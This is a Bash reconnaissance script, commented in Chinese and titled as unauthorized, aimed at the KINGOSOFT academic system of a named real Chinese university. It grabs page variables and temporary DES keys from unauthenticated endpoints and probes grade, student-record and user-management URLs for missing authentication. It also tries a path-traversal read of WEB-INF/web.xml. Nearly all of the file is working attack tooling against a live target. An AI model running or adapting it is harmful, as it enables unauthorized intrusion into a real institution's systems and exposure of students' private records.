#!/usr/bin/env bash
# KINGOSOFT 教务系统 未授权侦察脚本（纯 curl，无需 node）
# 用法: bash recon.sh [BASE_URL]
# 默认目标: 华北水利水电大学

BASE="${1:-https://jwmis.ncwu.edu.cn/hsjw}"
HOST="${BASE%%/hsjw*}"
OUT="recon_$(date +%Y%m%d_%H%M%S).txt"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

say() { printf "%s\n" "$*" | tee -a "$OUT"; }
probe() {
  local p="$1"
  local r
  rm -f /tmp/_r.bin
  r=$(curl -sS -k -A "$UA" -o /tmp/_r.bin -w "code=%{http_code} len=%{size_download}" -m 10 "$BASE$p" 2>/dev/null)
  local l=$(stat -c%s /tmp/_r.bin 2>/dev/null || echo 0)
  local code=$(echo "$r" | sed -n 's/.*code=\([0-9]*\).*/\1/p')
  local tag
  if [ "$code" = "000" ]; then tag="RST/WAF "
  elif [ "$code" = "404" ]; then tag="NOTFOUND"
  elif [ "$l" -lt 700 ] && grep -qa "凭证已失效" /tmp/_r.bin 2>/dev/null; then tag="DENY577 "
  elif [ "$l" -gt 1000 ]; then tag="OPEN    "
  else tag="EMPTY   "; fi
  say "  $tag  $r  $p"
}

say "=============================================="
say " KINGOSOFT 教务系统 侦察  $(date '+%F %T')"
say " 目标: $BASE"
say "=============================================="

say ""
say "[1] 基础指纹"
curl -sS -k -A "$UA" -I -m 10 "$HOST/" 2>/dev/null | tee -a "$OUT" | head -8
say ""
say "  --- 页面变量 ---"
curl -sS -k -A "$UA" -m 15 "$BASE/cas/login.action" 2>/dev/null \
  | iconv -f GBK -t UTF-8//IGNORE 2>/dev/null \
  | grep -aoE 'var (yzmbt|_webRootPath|_sessionid|schoolcode|modename) *= *"[^"]*"' \
  | tee -a "$OUT"

say ""
say "[2] 免鉴权接口"
probe "/frame/homepage?method=getTempDeskey"
probe "/frame/homepage?method=getTempNowtime"

say ""
say "  --- 动态密钥实测 ---"
DK=$(curl -sS -k -A "$UA" -m 10 "$BASE/frame/homepage?method=getTempDeskey" 2>/dev/null)
TS=$(curl -sS -k -A "$UA" -m 10 "$BASE/frame/homepage?method=getTempNowtime" 2>/dev/null)
say "  getTempDeskey  = $DK  (${#DK} 位)"
say "  getTempNowtime = $TS"

say ""
say "[3] 业务接口鉴权状态"
for p in \
  "/xtgl/index_initMenu.action" \
  "/xsxxxggl/xsxxwh_cxXsxx.do?xh=2020010101" \
  "/xscj/cjcx_list.do?xh=2020010101" \
  "/xskb/xskb_list.do?xh=2020010101" \
  "/kwgl/ksap_list.do?xh=2020010101" \
  "/pyfa/pyfa_list.do?xh=2020010101" \
  "/xjgl/xjxx_list.do?xh=2020010101" \
  "/xtgl/yhgl_cxYhxx.do?gnmkdm=N102020" \
  "/xtgl/index_initMenu.action?gnmkdm=N102020" ; do
  probe "$p"
done

say ""
say "[4] 登录端点连通性"
RESP=$(curl -sS -k -A "$UA" -m 10 -X POST "$BASE/cas/logon.action" \
  -d "params=&token=&timestamp=" 2>/dev/null)
say "  空POST -> $RESP"

say ""
say "[5] 防护设备探测"
for p in "/WEB-INF/web.xml" "/META-INF/MANIFEST.MF" "/custom/js/../../WEB-INF/web.xml"; do
  probe "$p"
done

say ""
say "=============================================="
say " 完成. 结果已保存: $OUT"
say " 下一步: 用合法账号执行 -> node kingo.mjs login <学号> <密码>"
say "=============================================="
